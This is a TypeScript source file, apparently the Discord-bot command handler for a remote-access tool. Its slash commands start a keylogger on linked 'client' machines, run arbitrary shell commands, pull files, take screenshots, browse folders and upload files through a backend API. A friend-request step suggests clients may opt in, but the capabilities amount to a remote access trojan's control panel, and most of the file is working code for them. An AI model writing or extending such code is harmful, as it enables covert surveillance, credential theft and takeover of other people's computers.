import { type DiscordClient } from "@/clients/DiscordClient";
import HttpClient from "@/clients/HttpClient";
import { embeds, emojis, fallbackAvatar } from "@/shared";
import { Logger } from "@/shared/Logger";
import { type AxiosError } from "axios";
import {
	ActionRowBuilder,
	StringSelectMenuBuilder,
	StringSelectMenuOptionBuilder,
	User,
	type ChatInputCommandInteraction
} from "discord.js";
import path from "path";
import { type Socket } from "socket.io-client";
import { CommandHandler } from "../CommandHandler";
import { PermissionHandler } from "../PermissionHandler";
import { ChatWsServiceHandlers } from "@/services/ws/WsServiceHandlers";

export const runChatCommandHandler = async (
	client: DiscordClient,
	interaction: ChatInputCommandInteraction,
	ws: Socket
) => {
	try {
		const wsServiceHandlers = new ChatWsServiceHandlers(client, ws, interaction);

		const user = await client.users.fetch(interaction.user.id);
		const dmChannel = await user.createDM();
		const controllerid = interaction.user.id;

		const command = client.commands.get(interaction.commandName);

		if (!command) return;

		const permissionHandler = new PermissionHandler({ client, interaction });
		const permissionError = await permissionHandler.checkPermissions({
			botPermission: command.botPermissions,
			userPermission: command.userPermissions,
			customPermissions: command.customPermissions
		});

		if (permissionError) {
			await interaction.reply({
				content: permissionError,
				ephemeral: true
			});
			return;
		}

		console.log("Running chat command", interaction.commandName);

		const handler = new CommandHandler({
			client,
			interaction,
			color: client.config.colors.burple,
			prefix: client.config.bot.PREFIX
		});

		if (interaction.commandName === "upload") {
			const file = interaction.options.getAttachment("file");
			const controllerid = interaction.user.id;

			await interaction.reply({
				content: `${emojis.Loading} Uploading file...`
			});

			await HttpClient.axios.post({
				url: `/controllers/${controllerid}/upload-file`,
				data: {
					fileroute: file?.url
				}
			});

			await interaction.editReply({
				content: `${emojis.Loading} Sending file to client...`
			});

			ws.removeAllListeners("message");
			ws.on("message", async (data: { controllerid: string; editReply: boolean }) => {
				console.log("Message received", data);
				if (data.controllerid !== controllerid) return;
				if (data.editReply) {
					await interaction.editReply({
						content: `${emojis.Success} File uploaded successfully! ${data.controllerid}`
					});
				} else {
					await interaction.reply({
						content: `${emojis.Success} File uploaded successfully! ${data.controllerid}`
					});
				}
				// await command.run(client, handler, ws, interaction);
			});
		}

		if (interaction.commandName === "keylogger") {
			const status = interaction.options.getBoolean("status");

			await interaction.reply({
				content: `${emojis.Loading} Emitting keylogger...`
			});

			await HttpClient.axios.post({
				url: `/controllers/${controllerid}/keylogger`,
				data: {
					status
				}
			});

			await interaction.editReply({
				content: `${emojis.Success} Keylogger is now ${status ? "active" : "inactive"}`
			});
		}

		if (interaction.commandName === "cmd") {
			const controllerid = interaction.user.id;
			const command = interaction.options.getString("command") ?? "";
			Logger.info("Running cmd command", interaction.commandName, command, controllerid);

			void HttpClient.axios.post({
				url: `/controllers/${controllerid}/cmd`,
				data: {
					command
				}
			});
		}

		if (interaction.commandName === "get") {
			const controllerid = interaction.user.id;
			const route = interaction.options.getString("route") ?? "";
			const folder = interaction.options.getString("folder") ?? "";
			Logger.info("Running get command", interaction.commandName, route, folder, controllerid);
			void HttpClient.axios.post({
				url: `/controllers/${controllerid}/file`,
				data: {
					fileroute: path.join(folder, route),
					controllerid
				}
			});
		}

		if (interaction.commandName === "tasks") {
			const controllerid = interaction.user.id;
			Logger.info("Running tasks command", controllerid);

			void HttpClient.axios
				.get({
					url: `/controllers/${controllerid}/tasks`
				})
				.then((res) =>
					// interaction.reply({
					// 	content: ""
					// })
					Logger.info("Tasks response", res)
				);

			await interaction.reply({
				content: `${emojis.Loading} Getting tasks...`,
				ephemeral: true
			});
		}

		if (interaction.commandName === "screenshot") {
			const controllerid = interaction.user.id;
			Logger.info("Running screenshot command", controllerid);
			const message = await interaction.reply({
				content: `${emojis.Loading} Gettings screens...`
			});

			const messageData = await interaction.fetchReply();
			console.log("Message id", message);
			// console.log("Screenshot response", messageId);

			await HttpClient.axios
				.post({
					url: `/controllers/${controllerid}/get-screens`,
					data: {
						messageid: messageData.id
					}
				})
				.then(async (res) => {
					Logger.info("Screenshot response", res);
				})
				.catch(async (err: unknown) => {
					const adapterError = (err as AxiosError).response?.data;
					Logger.error("Error sending screenshot", JSON.stringify(adapterError));

					if (adapterError.status === 409) {
						await interaction.editReply({
							content: `${emojis.Error} You are not authorized to run this command`
						});
					} else {
						await interaction.editReply({
							content: `${emojis.Error} Error sending screenshot`
						});
					}
				});

			// await wsServiceHandlers.GetScreensFromClient(messageData.id);
		}

		if (interaction.commandName === "explorer") {
			const controllerid = interaction.user.id;
			const folder = interaction.options.getString("folder");

			if (!folder) return;

			const currentFolder = client.folderPath.get(controllerid);

			if (currentFolder !== folder) {
				client.relativeFolder.set(controllerid, "/");
			}

			// TODO: PASS MESSAGE ID

			// await interaction.reply({
			// 	content: `${emojis.Loading} Getting explorer...`
			// });

			Logger.info("Running explorer", interaction.commandName, folder, controllerid);
			await HttpClient.axios
				.post<{
					message: string;
				}>({
					url: `/controllers/${controllerid}/explorer`,
					data: {
						folder: folder ?? "Desktop",
						relativepath: "/"
					}
				})
				.then(async () => {
					// await interaction.editReply({
					// 	content: `${emojis.Loading} Sending explorer request...`
					// });
				})

				.catch(async (err: unknown) => {
					const adapterError = (err as AxiosError).response?.data;
					// console.log("Explorer error", adapterError);
					if (adapterError.statusCode === 401 || adapterError.statusCode === 401) {
						await interaction.reply({
							content: `${emojis.Error} You are not authorized to run this command`,
							ephemeral: true
						});
						return;
					}

					await interaction.reply({
						content: `${emojis.Error} Something went wrong!`,
						ephemeral: true
					});
				});
		} else {
			try {
				await command.run(client, handler, ws, interaction);
			} catch (error) {
				console.error(error);
				await interaction.reply({
					content: `${emojis.Error} An error occurred while executing this command!\n\`\`\`js\n${error}\n\`\`\``,
					ephemeral: true
				});
			}
		}

		if (interaction.commandName === "add") {
			const controllerid = interaction.user.id;
			Logger.info("Running add", controllerid);

			const clientid = interaction.options.getString("id");

			await interaction.reply({
				content: `${emojis.Loading} Adding client ${clientid}...`
			});

			const res = await HttpClient.axios.post<{ status: boolean; isAlreadyAdded: boolean }>({
				url: `/controllers/${controllerid}/add-friend`,
				data: {
					clientid,
					username: interaction.user.username,
					avatar: interaction.user.avatarURL() ?? fallbackAvatar
				}
			});

			if (res.status) {
				await interaction.editReply({
					content: `${emojis.Success} ${clientid} was sent a friend request. Once they accept, you can now connect to them using </connect:1346449430064267335>`
				});
			} else {
				if (res.isAlreadyAdded) {
					await interaction.editReply({
						content: `${emojis.Warning} You already added this client! Check your client list using </clients:1346410332507340812>`
					});
					return;
				}

				await interaction.editReply({
					content: `${emojis.Error} An error occurred while adding ${clientid}.`
				});
			}
		}

		// ws.once("addFriend", async (data: {clientid:string, controllerid:string, accept:boolean}) => {

		if (interaction.commandName === "activate") {
			Logger.info("Running activate", interaction.user.id);
			const controllerid = interaction.user.id;

			await interaction.reply({
				content: `${emojis.Loading} Activating your account...`
			});

			console.log("Activating account", interaction.user);

			const res = await HttpClient.axios.post<{ status: boolean; isAlreadyActivated: boolean }>({
				url: `/controllers/${controllerid}/activate`,
				data: {
					picture: interaction.user.avatarURL() ?? fallbackAvatar,
					name: interaction.user.globalName
				}
			});

			// Logger.info("Activate response", JSON.stringify(res));
			if (res.status) {
				const user = await client.users.fetch(controllerid);

				const channel = await user.createDM();

				// console.log("Channel", channel);
				await interaction.editReply({
					content: `${emojis.Success} Your account has been activated successfully!`
				});
			} else {
				if (res.isAlreadyActivated) {
					await interaction.editReply({
						content: `${emojis.Warning} Your account is already activated. You do not need to activate your account again.`
					});
					return;
				}

				await interaction.editReply({
					content: `${emojis.Error} An error occurred while activating your account.`
				});
			}
		}

		if (interaction.commandName === "connect") {
			await interaction.reply({
				content: `${emojis.Loading} Getting clients...`
			});

			const messageid = (await interaction.fetchReply()).id;

			const { clients } = await HttpClient.axios.get<{
				clients: Array<{
					clientid: string;
					isactive: boolean;
					isconnected: boolean;
					alias: string;
				}>;
			}>({
				url: `/controllers/${controllerid}/friends`
			});

			// console.log(clients);

			// const owner = await client.users.fetch(ownerid);

			// Create embed & show
			const embedClients = {
				title: "Clients",
				description: "List of your friended clients:",
				fields: [
					{
						name: "Clients",
						value: clients
							.map((client) => {
								let emoji;
								if (client.isactive) {
									if (client.isconnected) {
										emoji = emojis.Dnd;
									} else {
										emoji = emojis.Online;
									}
								} else {
									emoji = emojis.Offline;
								}

								return `* ${emoji} ${client.alias} *(${client.clientid})*`;
							})
							.join("\n")
					}
				],
				color: embeds.Colors.default
			};

			// await handler.reply({

			// });

			const components = [];

			const filteredClients = clients.filter((client) => !client.isconnected);

			if (filteredClients.length === 0) {
				await interaction.editReply({
					content: `${emojis.Warning} All clients are already in use.`,
					embeds: [embedClients]
				});
				return;
			}

			const selectionClient = new StringSelectMenuBuilder()
				.setCustomId("client-select-menu")
				.setPlaceholder("Select a client")
				.addOptions(
					filteredClients.map((client) =>
						new StringSelectMenuOptionBuilder()
							.setLabel(`${client.alias} (${client.clientid})`)
							.setValue(`${client.clientid}.${messageid}`)
					)
				);

			const rowSelectionClient = new ActionRowBuilder<StringSelectMenuBuilder>().addComponents(
				selectionClient
			);

			components.push(rowSelectionClient);

			await interaction.editReply({
				content: "",
				embeds: [embedClients],
				components
			});
		}

		if (interaction.commandName === "disconnect") {
			const controllerid = interaction.user.id;

			await interaction.reply({
				content: `${emojis.Loading} Disconnecting...`
			});

			const res = await HttpClient.axios.post<{ status: boolean }>({
				url: `/controllers/${controllerid}/disconnect-client`,
				data: {
					controllerid
				}
			});

			if (res.status) {
				await interaction.editReply({
					content: `${emojis.Success} Sent disconnect request.`
				});
			} else {
				await interaction.editReply({
					content: `${emojis.Error} An error occurred while disconnecting.`
				});
			}
		}
	} catch (error) {
		Logger.error("Error in runChatCommandHandler", error);
		await interaction.reply({
			content: `${emojis.Error} An error occurred while executing this command!`,
			ephemeral: true
		});
	}
};
